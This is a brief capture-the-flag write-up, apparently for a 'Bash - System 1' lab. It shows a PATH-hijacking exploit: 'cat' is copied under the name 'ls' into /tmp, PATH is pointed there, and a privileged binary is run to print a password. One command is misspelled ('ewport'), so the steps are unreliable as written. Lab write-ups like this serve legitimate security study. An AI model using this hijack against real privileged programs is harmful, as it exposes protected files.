# Challenge Bash - System 1

## Todo : 

execute the compilated ch11 to Show the password

### Note :

  - alias and export not working in this case 

## Exploit :

mkdir -pv /tmp/exploit

cp -avr $(which cat) /tmp/exploit/ls

ewport PATH=/tmp/exploit

./ch11
